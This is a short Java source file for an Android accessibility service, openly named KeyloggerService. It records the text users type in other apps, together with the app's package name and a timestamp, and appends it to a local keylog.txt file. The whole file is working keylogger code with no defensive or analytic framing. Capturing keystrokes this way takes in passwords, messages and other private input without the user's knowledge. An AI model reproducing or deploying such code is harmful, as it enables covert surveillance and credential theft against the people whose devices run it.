package com.rainbow.client;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence txt = event.getText() != null && !event.getText().isEmpty()
                        ? event.getText().get(0) : "";
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                JSONObject o = new JSONObject();
                o.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));
                o.put("pkg", pkg);
                o.put("text", txt.toString());
                File f = new File(getFilesDir(), "keylog.txt");
                FileOutputStream out = new FileOutputStream(f, true);
                out.write((o.toString() + "\n").getBytes());
                out.close();
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {}
}